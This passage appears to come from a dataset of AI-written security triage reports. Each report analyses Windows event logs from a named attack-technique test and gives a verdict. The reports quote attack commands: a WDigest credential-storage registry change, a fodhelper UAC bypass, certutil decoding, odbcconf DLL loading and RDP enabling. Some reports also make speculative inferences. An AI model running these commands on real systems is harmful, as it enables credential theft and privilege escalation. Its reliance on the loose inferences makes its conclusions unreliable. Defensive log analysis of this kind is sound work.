4. **Sysmon Observations:**
   - Sysmon logs show execution of utilities like `wevtutil.exe`, which is used for managing event logs, potentially indicative of attempts to clear or manipulate logs post-compromise.
   - The suspicious execution of `hostname.exe`, `whoami.exe`, and multiple occurrences of `conhost.exe` may indicate reconnaissance or privilege confirmation attempts post-exploitation.

5. **Security Controls:**
   - Windows Defender logs indicate that the security software was operating ('SECURITY_PRODUCT_STATE_ON'), but this alone does not mitigate or confirm prevention of the above suspicious activities.

### Assessment:

Based on the analysis, there is clear evidence of behavior consistent with malicious activity.

- The PowerShell script and associated process executions suggest an attempt to establish persistence and escalate privileges.
- Registry modification to execute command-line activities without direct user action is a red flag for malware behavior or unauthorized system access.

### Resolution:

**MALICIOUS**

### Recommended Actions:

1. **Immediate Containment:**
   - Isolate the affected machine (Server002) from the network to prevent further spread or exfiltration of data.
   
2. **Detailed Forensic Analysis:**
   - Perform a full disk forensic analysis on the affected machine to determine the scope of compromise and identify any additional artifacts or payloads.
   
3. **Credential Reset:**
   - Reset credentials for potentially affected accounts, particularly the user account 'admin_test.'

4. **Log Review and Monitoring:**
   - Review all logs for additional indicators of compromise across the network.
   - Increase monitoring on critical assets to detect similar anomalies.

5. **Security Posture Review:**
   - Ensure all systems are patched and antivirus definitions are up to date.
   - Evaluate and potentially enhance security monitoring capabilities to detect similar activity in real-time.

By taking these steps, further damage can be avoided, and a comprehensive understanding of the event can be achieved."
Regsvcs Uninstall Method Call Test,"Based on the analysis of the provided logs, here is a summary of the findings:

1. **Security Log Analysis**:
   - The log entries show multiple logon events (Event ID 4624) and privilege assignment events (Event ID 4672). These events are related to the SYSTEM account on SERVER002, which indicate system-level activities that are usually benign.
   - An administrative account named ""admin_test"" is actively involved in modifying COM+ Application and Component properties, which is captured in several Event ID 5888 and 5890 entries. This could be normal administrative activity or potentially suspicious if not expected.

2. **PowerShell Log Analysis**:
   - The PowerShell logs indicate execution of a suspicious script that involves the compilation of a .NET assembly using `csc.exe` and subsequent execution of `regsvcs.exe`. This pattern is often associated with malicious activity such as executing payloads or running scripts to evade detection.

3. **Sysmon Log Analysis**:
   - The Sysmon logs corroborate the PowerShell activity and provide detailed process execution trails. There is evidence of `powershell.exe` executing commands, specifically pointing to a suspicious base64 encoded script. The decoded script attempts to generate a strong name key (`key.snk`), compile a .NET DLL (`data.009.dll`), and register it (`regsvcs.exe`), which strongly aligns with tactics used in fileless malware or in-memory execution.
   - The presence of commands and high integrity level execution raises red flags regarding potential unauthorized administrative actions or exploitation attempts.

4. **Application Log Analysis**:
   - COM+ and MSDTC (Microsoft Distributed Transaction Coordinator) activity is noted, aligning with the modification actions seen in the Security and Sysmon logs. If such modifications were unauthorized or unexpected, they could be signs of a compromise.
   - The logs show some routine application update activities, specifically related to the Microsoft Edge Update service.

**Assessment**:
- The use of encoded PowerShell scripts, compilation of .NET binaries, and interactions with COM+ attributes without clear legitimate context strongly suggests a compromise or attempted lateral movement or persistence techniques often used by attackers.

**Recommendation**:
- Immediately review and restrict access to the ""admin_test"" account.
- Investigate the source and intent of the PowerShell script execution.
- Conduct a full security assessment of the server to determine how the script was executed and if the system has been compromised.
- Review and tighten security policies around script execution and administrative privileges.

**Resolution**:
MALICIOUS - The logs indicate activity consistent with malicious behavior, particularly the PowerShell script execution and the creation and registration of suspicious .NET assemblies. Immediate action is recommended to contain and remediate the threat."
Rundll32 with desk.cpl,"Upon reviewing the provided logs, the following observations and analysis indicate potential suspicious activities:

1. **Security Log (Event ID 4672 and Event ID 4624):**
   - There are multiple instances of Event ID 4672 indicating that the user `admin_test` was granted special privileges, which include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others often associated with elevated rights potentially allowing access to sensitive information or altering system security settings.
   - Event ID 4624 log entries with LogonType 3, typically associated with network logons, show successful logons for the `admin_test` user, indicating potentially abnormal patterns of activity if such accesses are unusual for the user.

2. **Sysmon Log (Process Creation and Execution):**
   - **Command Execution:** There exists an execution of `cmd.exe` with a command line that includes `rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr`. This command is suspicious as it is associated with attempts to disguise malicious activities as legitimate screensaver operations. The file `not_an_scr.scr` is created by copying `calc.exe`, masquerading potentially malicious code.
   - **Parent-Child Process Relationship:** The command line involves creating a `.scr` (screensaver file) and running it with `rundll32.exe`, suggesting potential execution of unauthorized or malicious code.
   - **Potential Privilege Escalation:** The command line execution resembles a known technique used to achieve privilege escalation and persistence on compromised systems.

3. **System Log (Time Changes):**
   - A slight manipulation of system time is observed, potentially indicative of an attacker attempting to manipulate logs or confuse time-based defenses. The adjustment, however, is minor and could be benign unless coupled with additional context confirming malicious intent.

4. **Software Installation and Execution:**
   - Multiple executions of Microsoft Edge installers (`setup.exe` for Microsoft Edge) seem legitimate; however, the presence of misleading file names and potentially unauthorized utilizations of installation executables under different names could indicate obfuscation attempts or installer abuse.

5. **PowerShell logs:**
   - While not explicitly detailed, the absence of PowerShell log entries could signal tampering or that PowerShell was used in a way that evades typical logging, which would be suspicious given the context of other findings.

### Conclusion:
Given the specific actions and command-line activities discovered in the logs, there is clear evidence of potentially unauthorized and suspicious activity, particularly surrounding the creation and execution of processes involving atypical use of `rundll32.exe` for executing a screensaver file. This manipulation is a common trait in malware activities.

**Resolution: SUSPICIOUS**
- The activities do not provide concrete evidence of malware, but they are suspicious enough to warrant further investigation into system integrity, user activities, especially around the `admin_test` account, and any newly created or modified files on the system.
  
### Recommendations:
- Conduct a thorough endpoint investigation focusing on filesystem changes around the timestamps of the suspicious log entries.
- Isolate `admin_test` user's account and check the legitimacy of recent activities and sessions.
- Perform an in-depth scan for malicious software or unauthorized system changes.
- Review the broader network logs for corroborating evidence of lateral movement or external communications suggestive of compromise."
Enable RDP via Registry (fDenyTSConnections),"Based on the analysis of the provided Windows event logs, here are the key observations:

1. **Time Synchronization**: There is a noticeable time discrepancy adjustment logged where the system time was adjusted. This kind of time manipulation could indicate a potential attempt to evade detection in logs due to timestamp forgery. However, it could also be a benign activity if there's a valid reason like a system clock adjustment by authorized personnel or services like Windows Time Service.

2. **Service Activity**: The logs indicate typical service activity related to ""Microsoft Edge Update,"" which seems consistent with updates or setup activities. The frequent operations and command line executions related to Microsoft Edge updates are not, by themselves, indicative of suspicious activity unless correlated with unauthorized installation attempts or unusual timings.

3. **Remote Connection Management**: The logs show events from the Microsoft-Windows-TerminalServices-RemoteConnectionManager, but they do not state any failed or suspicious logins by themselves; thus, they appear routine.

4. **Security Logs**: There were multiple security logon events for ""SYSTEM"" via ""Advapi."" These events correspond to service actions on the system and are typical for a system running various services.

5. **Sysmon Logs**: There's a critical point of interest:
   - A command to modify the Windows Registry key related to ""Terminal Server"" to allow remote desktop connections (`fDenyTSConnections` set to 0) is logged. This command stands out because it could mean the enabling of Remote Desktop Protocol (RDP) on the machine, which could potentially be a sign of privilege escalation if initiated without authorization.

### Assessment and Resolution:
- **Suspicious Behavior**:
  - The registry change to enable RDP (`fDenyTSConnections /t REG_DWORD /d 0 /f`) without clear authorization is suspicious. This could potentially indicate an attempt at unauthorized remote access control.

Considering the above points, the presence of the registry modification indicates activity that could be potentially unauthorized and needs to be examined thoroughly to ensure no malicious incidents, like unauthorized remote access, are being attempted.

**Resolution**: **SUSPICIOUS**

### Recommendations:
- **Immediate Action**: Verify the intent behind the registry changes. Confirm with IT administrators if this action was planned or required under their purview. If unauthorized, this is a clear indicator of potential malicious behavior.
- **Monitor System**: Increase monitoring on the system for unusual RDP login attempts or any unauthorized access patterns.
- **Audit Remote Access Policies**: Ensure remote access policies are strictly enforced and secure.
- **Further Investigation**: Conduct a full security audit on the affected system to ensure no further malicious configurations or software have been installed."
Indirect Command Execution - forfiles.exe,"Upon analyzing the provided logs, here is a detailed assessment of the activity:

### Assessment and Analysis:

1. **Windows Defender State**:
   - The Application logs show that Windows Defender is operational, which is a positive sign for the security posture of the system.

2. **Sysmon Events**:
   - **Process Executions**: A significant number of Microsoft Edge Update-related processes are observed. These could be linked to standard update procedures; however, frequent and rapid spawn of processes is unusual and may warrant further observation.
   - **Unusual Command Execution**: The command `cmd.exe /c forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe` executed by the `admin_test` user is concerning. This command could potentially be part of a script-kiddie activity, trying to execute unexpected software. The use of forfiles with executable operations on a common executable directory is suspicious.
   - **Wevtutil and Conhost Executions**: Wevtutil.exe is a command-line tool useful for event log management, and its repetitive execution might indicate log tampering or scraping attempts. Multiple executions of conhost.exe tie back to different tasks but can often be benign in nature.

3. **Security Events**:
   - **Logon Events**: Multiple logon sessions under the SYSTEM account are observable, which is typical for service operations. However, given the suspicious command activity, it is crucial to verify if these were authorized.
   - **Credential Access Attempt**: Event 5379 indicates multiple failed accesses to live accounts and services, albeit under the SERVER002$ account, it shows unsuccessful operations which might be part of normal background operations.

4. **EdgeUpdate Processes**:
   - Many instances of EdgeUpdate and MicrosoftEdgeUpdate.exe are observed in both Sysmon and Application logs. This could hint at either legitimate update operations or potential abuse of a legitimate service for malicious purposes (living off the land).

5. **Overall Patterns and Trends**:
   - The logs reflect typical Windows Update behavior and legitimate processes running under SYSTEM privileges, which match expected behavior, including Edge updates. 
   - The lingering presence of suspect command line executions (""forfiles"" with executables), however, might not directly link to maliciousness but could require further contextual investigation to rule out shadow IT or misuse.

### Guidance and Resolution:

- **Follow-Up Actions**:
  - Review logs to find contextual information tied to the `admin_test` user and any scripts or tasks they may have run.
  - Validate the environment context of the suspicious command (forfiles with calc.exe) to understand the origin and intent.
  - Confirm the legitimacy of Microsoft Edge's frequent updates possibly by cross-referencing with official release and update notifications from Microsoft.
  - Monitor the system for recurring patterns or deviations in behavior, especially with privileged processes or unexpected tool invocations.

**Resolution**: **SUSPICIOUS** - While the system activity could potentially be explained by benign reasons like automated updates or scheduled tasks, the presence of non-standard command executions and the high frequency of certain processes justifies deeper investigation to ensure no underlying malicious activity is masked as routine operations.
"
System Scope COR_PROFILER,"### Detailed Analysis of the Logs:

1. **PowerShell Activity:**
   - Multiple PowerShell executions are logged. They are modifying system environment variables related to .NET profiling:
     - `COR_ENABLE_PROFILING` is set to ""1"".
     - `COR_PROFILER` is set to a GUID.
     - `COR_PROFILER_PATH` is set to a path of a DLL located within a user's temporary directory.
   - The command line for this activity indicates use of administrative privileges (`High` integrity level) and the execution path suggests manipulation of environment variables which are typical indicators of malicious activity or preparation for a more advanced attack, potentially involving the loading of a malicious DLL.
   - These changes do not appear to correlate with typical IT administrative tasks and suggest potential initial compromise or pre-implant staging.

2. **Process Execution via Sysmon:**
   - The Sysmon logs show multiple executions of seemingly benign executables like `whoami.exe`, `hostname.exe`, and various instances of `MicrosoftEdgeUpdate.exe`. However, these are often used in lateral movement or enumeration phases during an attack.
   - The user executing these processes is `SERVER002\admin_test`, which might be a generic administrative or test account. Further investigation into the owner's recent activities and legitimacy of use is recommended.
   - One concerning aspect is the consistent pattern of launching system utilities and modifying system settings using a temporary path, which might be part of a living-off-the-land technique.

3. **Edge Update Activities:**
   - Extensive logging of `MicrosoftEdgeUpdate.exe` and other Edge-related update processes appear in the logs.
   - While some of these entries could be part of legitimate browser update mechanisms, the logs captured are dense around the same timestamp as the suspicious PowerShell activity, suggesting potential misuse or exploitation of these processes for persistence or obfuscation.

### Indicators of Malicious Activity or Compromise:

- The coordinated and scripted execution of processes to modify critical system configurations using PowerShell is indicative of potential malicious intent.
- Execution of processes with elevated privileges that are typically used for reconnaissance (`whoami`, `hostname`) adds to the suspicion of an unauthorized user trying to gather information or escalate further.
- The timing of these processes tied closely with environmental changes (setting .NET profiling variables) raises the concern of an attacker preparing the environment for a next-stage payload.

### Assessment of the Situation:
Based on the analysis presented above, the activity in the logs strongly suggests an intrusive event that potentially indicates a compromise of `Server002`. The unauthorized changes to system environment variables, particularly those involving a profiler path to a temporary user directory, suggest attempts at injecting or hijacking processes.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Disconnect the affected system from the network to prevent further spread or exfiltration.
   - Engage in a forensic analysis to capture memory dumps and perform disk imaging for detailed investigation.
   - Check and potentially disable the `.NET profiling` configurations that were set, especially if they are traced back to unauthorized activity.

2. **Further Investigation:**
   - Conduct an audit of active user accounts, focusing on those with elevated privileges.
   - Review access logs, VPN connections, and any remote desktop sessions to probe for unauthorized access.
   - Utilize threat intelligence to match indicators such as GUIDs or file hashes to known threats.

3. **Remediation:**
   - Apply available security patches and updates, especially concerning the exploitability of administrative utilities.
   - Enhance endpoint security monitoring and increase log verbosity.
   - Initiate a security awareness program to educate users about the risks and indicators of suspicious activities."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Upon reviewing the provided logs, I have identified several entries that could indicate potentially suspicious activities. Here is a detailed analysis:

1. **PowerShell Usage**:
   - Multiple PowerShell events are captured in the logs, starting with an invocation of `Invoke-CimMethod` to install a `.msi` package located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_JScript.msi`). 
   - Malicious actors often use PowerShell for script-based attacks due to its automation capabilities and subversion tactics.
   - The temporary path and use of PowerShell to install the `.msi` package are unusual, especially on a machine belonging to a high-profile user like the CEO.

2. **Process Creation and Usage**:
   - The Sysmon logs show repeated process creation events for utilities like `whoami.exe` and `hostname.exe`, which could indicate information gathering or enumeration attempts.
   - The process `wsmprovhost.exe` appears as a parent process for PowerShell, which could be legitimate but is worth examining in the context of the overall system behavior and other correlated events.
   - Processes such as `conhost.exe` and `wevtutil.exe` execute multiple times, but they are controlled by user `SERVER002\\admin_test`, suggesting the account is active during the period of concern.

3. **MsiInstaller Events**:
   - The Application logs contain events showing the installation of the same suspicious MSI package, aligning with the PowerShell invocations. This consistency across logs strengthens the suspicion that unauthorized software installation might be occurring.

4. **TimeService and Kernel-General Event Logs**:
   - Minor time adjustments and svchost.exe executing them are observed in the System and Security logs; however, nothing immediately suggests malicious tampering from the timestamps, focusing more on administrative actions.

5. **EdgeUpdate Activity**:
   - Events related to `MicrosoftEdgeUpdate.exe` also appear in the logs.
   - While this could represent legitimate updates, in conjunction with the suspicious PowerShell activity, all updates and installations should be verified for legitimacy, paying close attention to the files executing in temporary directories.

**Assessment of the Situation**:
- The use of PowerShell with temporary directory scripts and MSI package installation are red flags, especially on a critical machine like the CEO's.
- Information discovery attempts via `whoami.exe` suggest a reconnaissance operation within the network.
- Edge updates using temporary paths can be benign but should be cross-examined for integrity against official update schedules.

**Threats or Risks Identified**:  
- Potential unauthorized software installation through malicious scripts.
- Possible system reconnaissance or data gathering using native utilities.
- Elevated risk if these actions originate from a compromised or impersonated user account, leading to privilege escalation or lateral movement.

**Guidance on How to Proceed**:
1. **Immediate Investigation**: Verify the source and necessity of the PowerShell scripts and MSI package installation. Cross-reference with known legitimate applications or updates specific to the system.
2. **User Account Verification**: Ensure the `admin_test` account activity is legitimate and authorized, checking for signs of compromise.
3. **Containment Efforts**: If unauthorized activities are confirmed, isolate the machine to prevent potential spread and data leak.
4. **Forensic Analysis**: Capture relevant memory and disk snapshots for deeper forensic analysis.
5. **Communication**: Notify relevant stakeholders, including the CEO, about the findings and potential threats, while aligning on a response and recovery strategy.

**Resolution**: **SUSPICIOUS** - The logs indicate unusual activities that require further investigation to confirm or dismiss potential malicious intents."
Use Powershell to Modify registry to store logon credentials,"After analyzing the provided Windows event logs, several key observations can be made about the activities on the investigated host, Server002:

### 1. Summary of Findings:

- **Microsoft Edge Update Processes**: A substantial number of logs are associated with Microsoft Edge Update processes. These include processes like `MicrosoftEdgeUpdate.exe` and various installations under different directories, such as temp directories, indicating activity likely related to routine updates or maintenance of the Edge browser. These processes run under the `NT AUTHORITY\SYSTEM` user, which is common for system-level operations.
  
- **PowerShell Usage**: A PowerShell script was executed with the following command: 
  ```powershell
  Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore
  ```
  This command is used to enable WDigest authentication, which can allow plain text password retrieval from memory, typically associated with potential credential theft attempts.

- **System Time Change**: The logs show a change in the system time, which can sometimes indicate an attempt to manipulate timestamps to cover tracks or alter logs. However, this can also occur due to legitimate system operations like time synchronization with external time servers.

### 2. Analysis of Key Suspicious Activities:

- **PowerShell Command Running `Set-ItemProperty`**: The usage of this specific command raises suspicion as it directly influences system registry settings related to credential management. This is a common tactic employed in cyber-attacks to facilitate credential dumping. The exact intent behind altering the `UseLogonCredential` registry setting warrants further investigation.

- **Repeated Invocations of `wevtutil.exe` and `conhost.exe`**: These processes are typically used to interact with the Windows Event Log and Console Host respectively. Their repeated execution within the provided timestamps under the same user `SERVER002\admin_test` can be benign if linked to specific administrative tasks but should be verified to exclude any compromise attempts.

### 3. Risk Assessment and Threat Level:

- **Credential Threat**: The execution of the PowerShell script enabling WDigest suggests a heightened risk of potential credential harvesting. This action, combined with other logs, could suggest a malicious intent to gather credentials that can be used for lateral movements or privilege escalation.

### 4. Recommendations:

- **Immediate Investigation**: Conduct a thorough investigation into the purpose and origin of the suspicious PowerShell command. Assess whether it aligns with any known administrative tasks or if there are anomalies in administrative account usage or access patterns.

- **Audit & Forensics**: Perform a comprehensive security audit and forensic analysis to track any traced lateral movement or unauthorized access post the execution of the PowerShell command.

- **Security Measures**: If not an intended administrative change, revert the registry setting to disable WDigest and ensure that auditing for registry changes is enabled. Additionally, consider implementing Windows Defender Advanced Threat Protection or similar solutions for enhanced monitoring and incident tracking.

- **User Awareness & Authentication Protocols**: Increase user awareness around credential security and consider enforcing stronger authentication mechanisms, including multi-factor authentication, for administrative accounts.

### Resolution: **MALICIOUS**

Based on the analysis of the logs, particularly the execution of a PowerShell command designed to modify security-related registry settings with potential for credential theft, this activity is deemed malicious. Immediate action should be taken to investigate, remediate, and ensure that such activity is not indicative of a larger security breach."
Deobfuscate-Decode Files Or Information,"The logs provided for analysis exhibit some elements of typical Windows operating system execution as well as events that may indicate potential suspicious activity. Let's break down the relevant findings from each log category provided:

### Security Log

1. **Event 4624 (Logon) and 4672 (Special Privileges Assigned):**
   - User `admin_test` logs into `Server002` using LogonType `3` (Network Logon) via `NTLM` authentication. This may be standard operation if `admin_test` is performing legitimate network-based tasks.
   - The logon resulted in special privileges being assigned (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`), which are typical for administrative accounts.

### Sysmon Log

2. **Process Execution Analysis:**
   - There are several executions of `wevtutil.exe` and `conhost.exe` under the `admin_test` account, which in isolation appear normal but could be indicative of log manipulation or process host execution if combined with malicious intent.
   - Execution of benign software such as `whoami.exe` and `hostname.exe` are seen. These are typical system information utilities and don't signify malicious activity independently.
   - The command `cmd.exe /c certutil -encode C:\Windows\System32\calc.exe %temp%\data_calc.txt & certutil -decode %temp%\data_calc.txt %temp%\data_calc_decoded.exe` is suspicious. `Certutil.exe` being used to encode and decode files is often associated with bypassing security controls or moving malicious payloads. Encoding `calc.exe` to a temporary file and then decoding it back raises concern, especially if unintended.

3. **Other Process Activities:**
   - There are regular updates and execution activities related to `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, and other system processes (e.g., `WmiPrvSE.exe`, `TiWorker.exe`). These are mostly background system operations and do not indicate threats.

### Event Observations
- The use of `certutil` in the command line for file encoding and decoding without an apparent legitimate reason raises a red flag. While this can be used for legitimate administrative purposes, it can also facilitate file-based attacks or setup execution payloads.
- The processes emanating from `admin_test` show potentially dangerous command-line activities associated with `certutil`, which are common when seeking to bypass defenses or disguise operations.

### Assessment and Conclusion

Based on the evaluation of these logs, there are indications of potentially suspicious activity, notably concerning the use of `certutil` and the encoding/decoding operations. However, the presence of these events strictly doesn't equate to definitively confirmed malicious actions without more context about the user's intentions or organizational baselines for such behavior.

**Resolution: SUSPICIOUS**

### Guidance to Proceed
1. **Investigate Intent:**
   - Check with the user `admin_test` if there was any authorized activity carried out that involves the use of certutil and encoding/decoding practices on the host.
2. **Analyze Further Context:**
   - Assess whether similar patterns exist across other systems or if this system is under targeted attacks.
3. **Conduct Threat Hunting:**
   - Perform a more in-depth threat hunt to see if any unauthorized payloads or scripts executed following these activities.
4. **Strengthen Monitoring:**
   - Implement more robust monitoring for the `certutil` utility and its command-line arguments across endpoints to detect misuse early.
5. **Report and Remediate:**
   - If confirmed as unauthorized or malicious, remove any identified threat vectors, update security policies and user training regarding the acceptable use of system tools.

These steps will help identify the nature of the activity and mitigate any uncovered threats effectively."
Lolbas ie4uinit.exe use as proxy,"### Analysis of Logs

#### Overview
The logs provided include events from the Sysmon, Application, Security, and System logs on a machine named `Server002`. They capture events primarily focusing on process creations, command executions, logins, and security audits. Our investigation's goal is to identify any suspicious or potentially malicious behavior.

#### Key Observations

1. **Processes Executed:**
   - A series of processes were executed in a short span that included PowerShell, several `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`.
   - Notably, `cmd.exe` was used to copy and execute `ie4uinit.exe` with suspicious command-line arguments, indicating possible attempts to run a potentially malicious task (`cmd.exe /c copy ...`).

2. **Execution of PowerShell and Command Prompt (cmd.exe):**
   - Execution of `PowerShell` and `cmd.exe` is common, but with unusual timings and command lines, it raises suspicion. Especially the use of cmd.exe copying files like `ie4uinit.exe` to temporary directories and executing them.
   
3. **Windows Event Utilities:**
   - Execution of `wevtutil.exe`, which is used to manage event logs, could be an indicator of logs tampering or investigation by a threat actor.

4. **Security and Administration Tools:**
   - Several security and administrative tools such as `whoami.exe` (to check currently logged-in users), and `hostname.exe` (to get system hostname) were executed.
   - The context and chain of tools could suggest information gathering or enumeration behavior.

5. **Logon Events:**
   - Multiple `4624` logon events with `LogonType: 5` indicating service startups, which are expected but should be reviewed for any unusual patterns or timings alongside `4672` privileged logons.

6. **Access to Credentials:**
   - Security events `5379` indicate possible credential access attempts, though failing, raise concerns of unauthorized attempts to access stored credentials.
   
7. **Edge Update Execution:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` related processes indicating scheduled updates. These are expected but should be verified for authenticity of the binaries.

#### Potential Anomalies or Suspicious Activities

- **Use of Command Prompt with Complex Commands**: The command used `cmd.exe /c copy...` suggests a potentially unauthorized script or command execution that could be used to install or modify software outside of normal protocols.
- **File Manipulations in Temp Directories**: Executing `ie4uinit.exe` from temp directories with copied files at high-integrity levels suggests a script or executable attempt that may not be typical operation for the utility.
- **Credential Access Events**: The security log entries that show failed attempts to retrieve credentials imply possible attempts of credential theft.

### Threat Assessment

- A possibly unauthorized or suspicious script execution, or even preparation for more substantial malicious activities.

### Recommended Actions

1. **Immediate Investigation**:
   - Investigate the source and authenticity of `ie4uinit.exe` and any files in `%TEMP%` related to its execution.
   - Correlate the specific cmd.exe command execution with any authorized script or user activity.
   - Review access permissions and logs for `admin_test` to seek unauthorized escalations.

2. **Review and Monitor**:
   - Continue to monitor any events related to PowerShell or command-line executions with elevated privileges.
   - Check the legitimacy of scheduled jobs related to the processes and review Edge Update logs for authenticity.

3. **Potential Mitigations**:
   - Introduce stricter monitoring of script executions and their sources.
   - Implement or review application whitelisting/blacklisting mechanisms to prevent unauthorized executables from running.

### Resolution
**SUSPICIOUS** - The logs contain activity that indicates potential malicious intent, particularly around the use of `cmd.exe` and utilities typically used for enumeration or modification of system configurations. Further investigation is warranted to determine the intent and scope of the identified activities."
Odbcconf.exe - Execute Arbitrary DLL,"## Analysis of the Windows Event Logs

### Overview:
The primary focus of this analysis is to determine if there are any indicators of malicious activity within the logs from the CEO's machine on `Server002`. We have logs from multiple sources including Sysmon, Application, and System logs.

### Key Findings:

1. **Suspicious DLL Execution**:
   - Sysmon logs show a series of processes initiated by `cmd.exe` with the command line `\""cmd.exe\"" /c odbcconf.exe /S /A {REGSVR \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.008\\src\\Win32\\data.dll\""}`. 
   - The use of `odbcconf.exe` to register a DLL (`data.dll`) in a temporary directory is suspicious. This is a known technique used by attackers to execute arbitrary code by hijacking DLLs.

2. **PowerShell Execution**:
   - Multiple instances of PowerShell executions were noted (though details are not explicitly shown in the provided logs). PowerShell is often used by attackers due to its powerful system administration capabilities.

3. **Use of `wevtutil.exe`**:
   - `wevtutil.exe` was executed multiple times. This utility is used to manage Windows event logs. It may indicate an attempt to clear or alter logs to cover tracks.

4. **Execution of `whoami` and `hostname`**:
   - These commands were executed by the `admin_test` user. `whoami` is commonly used to verify the current user context, and `hostname` for system identification. In isolation, these could be benign, but in conjunction with other events could be a sign of reconnaissance or script execution.

5. **Microsoft Edge Update Processes**:
   - The logs show normal Edge update processes without any apparent anomalies. Multiple executions of Microsoft Edge Updater (`MicrosoftEdgeUpdate.exe`) were observed, consistent with update activities.

6. **Windows Defender Operational**:
   - Application logs indicate Windows Defender being in a ""SECURITY_PRODUCT_STATE_ON"" state. There are no logs indicating that Defender was turned off or bypassed, suggesting no apparent tampering.

### Assessment of the Situation:
The following suspicious activities have been noted:
- The registration of a potentially malicious DLL via `odbcconf.exe`.
- Unconventional use of native Windows utilities (`wevtutil.exe`, `cmd.exe`) and potentially PowerShell executions.
- This behavior is suggestive of possible early-stage post-compromise activities where an attacker may be leveraging native tools for execution and persistence.

### Resolutions:
- **Resolution: SUSPICIOUS**
  - The noted activities surrounding DLL registration and use of `cmd.exe` without an apparent benign purpose are suspicious. There is potential malicious intent, but further investigation is required to confirm whether these actions pose a real threat.
  
### Guidance on How to Proceed:
1. **Immediate Steps**:
   - Isolate the affected system (`Server002`) from the network to prevent potential lateral movement or additional malicious actions.
   - Conduct a memory capture and disk imaging of the affected system for a deeper forensic analysis.

2. **Further Investigation**:
   - Investigate the source of the `data.dll` and verify its legitimacy. Analyze it for known malware signatures or suspicious behavior.
   - Review additional system logs, including firewall logs and user activity, to pinpoint the origin of the suspicious commands.

3. **Preventive Measures**:
   - Enhance monitoring for similar command executions across other systems.
   - Conduct a security audit, focusing on user privileges and unauthorized access attempts.
   - Update all endpoint security tools and reinforce user training on recognizing suspicious system behaviors.

By proceeding with these steps, you can ascertain the authenticity of the suspected threats and take appropriate actions to mitigate any potential risks."
HTML Smuggling Remote Payload,"Based on the provided Windows event logs, here is the detailed analysis:

### Analysis Summary

1. **Suspicious Activity:**
   - The Sysmon logs suggest the execution of PowerShell script through an obfuscated command, specifically pointing to a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\data_006_remote.html`. While the use of PowerShell is common, executing scripts from the Temp directory is often an indication of suspicious or malicious activity.
   - There are numerous entries in the Sysmon logs detailing the execution of various Windows processes like `powershell.exe`, `wevtutil.exe`, `msedge.exe`, and accompanying `conhost.exe`. While these files are legitimate Windows components, their simultaneous execution with Temp directory involvement is unusual and potentially indicative of an attack vector such as Living Off the Land Binaries (LOLBins).
   - The presence of Edge with command lines including `--single-argument` and references to files in `C:\Users\ADMIN_~1\AppData\Local\Temp`, coupled with multiple utility processes, is potentially suspicious. These involve running tasks that might not be typical user behavior.

2. **Repeated Credential Access Attempts:**
   - Events in the Security logs show multiple occurrences of `EventID 5379` indicating attempts to access credential information for a Microsoft Account. All attempts show a `ReturnCode: 3221226021`, suggesting potential improper access or failed attempts to retrieve credential information. This activity could correlate with an attempt for privilege escalation or reconnaissance.

3. **Detection of System Utilities Execution:**
   - System utilities such as `whoami.exe`, `HOSTNAME.EXE`, and `taskhostw.exe` are observed running, which are commonly used in reconnaissance or for maintaining persistence by attackers. They could be benign but in association with other suspicious activities, they merit further investigation.

### Assessment of Risks

- The combination of PowerShell script execution from the Temp directory, alongside self-elevating Edge processes with direct interaction with the Temp directory, points toward potentially malicious activity. The usage patterns and processes involved could indicate an attempt to maintain persistence or exfiltrate data, common in advanced attack scenarios.

### Guidance

- **Immediate Investigation:**
  - Review the context and origin of the `data_006_remote.html` file and its contents to understand whether it is benign or has malicious scripts.
  - Examine the user `admin_test` for unauthorized access or any signs of compromise.
  - Review and correlate the events related to PowerShell and the Edge browser to identify their initiation trigger.
  - Check surrounding systems and network traffic for similar patterns or connections to suspicious endpoints.

- **Resolution: SUSPICIOUS**
  - The logs contain activity that doesn't immediately appear to be benign and requires further investigation to determine the nature and intent of the activities. The presence of scripts in the Temp directory, PowerShell command usage, and credential access attempts necessitate a cautious approach."
Bypass UAC using Fodhelper - PowerShell,"**Analysis:**

Upon reviewing the provided Windows event logs, several key points stand out that indicate potential malicious activity:

1. **Security Log Events:**
   - **Event 4624 (Logon Success):** This event indicates a successful logon using process `C:\\Windows\\System32\\services.exe` with SYSTEM privileges. Though a SYSTEM account logon is typical for system services, it is critical in understanding subsequent privilege escalations.
   - **Event 4672 (Special Privileges Assigned):** The SYSTEM account has been assigned several special privileges, including `SeDebugPrivilege`, which could be exploited by an attacker to alter system memory and potentially inject malicious code.

2. **PowerShell Log Entries:**
   - A series of PowerShell (EventID 600) actions were taken within a very short time frame. The script attempts to manipulate the Windows Registry specifically targeting a known UAC (User Access Control) bypass using `fodhelper.exe` with commands altering `HKCU:\software\classes\ms-settings\shell\open\command`. This technique is a known pattern for elevating privileges by bypassing UAC using a trusted executable.

3. **Sysmon Events:**
   - **Process Creation Events by Sysmon:** Detected suspicious PowerShell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) with a command line identical to the aforementioned UAC bypass attempt. The initiation from `wsmprovhost.exe` with high integrity level indicates potential remote activity possibly leveraged by an attacker.
   - Sysmon reveals the consistent spawning of processes involving `PowerShell` and `cmd.exe` (command prompt), aligning with known privilege escalation or persistence strategies used by attackers.
   
4. **Edge Update Process:**
   - Multiple EdgeUpdate processes across various Sysmon events indicate legitimate processes dealing with Microsoft Edge updates. However, they do not inherently showcase signs of compromise and are consistent with normal software update activities.

**Assessment:**

